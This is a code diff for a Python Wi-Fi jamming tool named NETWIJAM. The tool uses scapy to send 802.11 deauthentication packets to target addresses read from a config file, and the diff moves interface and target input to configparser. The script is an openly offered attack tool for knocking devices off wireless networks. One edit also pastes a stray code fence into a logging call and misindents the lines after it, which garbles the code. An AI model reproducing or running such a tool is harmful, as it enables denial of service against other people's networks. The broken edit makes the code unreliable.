@@ -5,6 +5,7 @@ import logging
 from scapy.all import *
 import threading
 import signal
+import configparser
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -12,12 +13,12 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 # Red banner with tool name and version
 def print_banner():
     print("\033[91m" + """
-    
+
 ▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▖ ▗▖
 ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘
 ▐▛▀▘ ▐▛▀▜▌▐▛▀▚▖▐▛▚▖ 
 ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
-            
+                                      
     NETWIJAM - Network and Wi-Fi Jammer
     Version: 1.1
     """ + "\033[0m")
@@ -63,11 +64,11 @@ def jam_networks(iface, targets):
 def send_deauth_packets(iface, addr):
     try:
         sendp(Dot11Deauth(addr1=conf.ifaddr, addr2=addr, addr3=conf.ifaddr), iface=iface, count=10)
-        logging.info(f"Sent deauth packets to {addr}")
-    except Exception as e:
-        logging.error(f"Failed to send deauth packets to {addr}: {e}")
+        logging.info```python
+                        logging.info(f"Sent deauth packets to {addr}")
+                    except Exception as e:
+                        logging.error(f"Failed to send deauth packets to {addr}: {e}")
 
-# Removed the incorrect line
 def handle_signal(sig, frame):
     logging.info("Shutting down gracefully...")
     sys.exit(0)
@@ -79,12 +80,13 @@ def main():
 
     print_banner()
 
-    iface = input("Enter your Wi-Fi interface name (e.g., wlan0): ")
+    config = configparser.ConfigParser()
+    config.read('config.ini')
+
+    iface = config.get('interface', 'name')
     set_monitor_mode(iface)
 
-    # Read targets from configuration file
-    with open('targets.txt', 'r') as file:
-        targets = file.read().splitlines()
+    targets = config.get('targets', 'targets').split(',')
 
     # Start the jamming process in a separate thread
     jam_thread = threading.Thread(target=jam_networks, args=(iface, targets))
@@ -103,7 +105,6 @@ def main():
 
     # Stop the animation
     print("\rJamming Wi-Fi and Networks... Done!")
-
+#code by FaceLessOfficial 
 if __name__ == "__main__":
     main()
-    
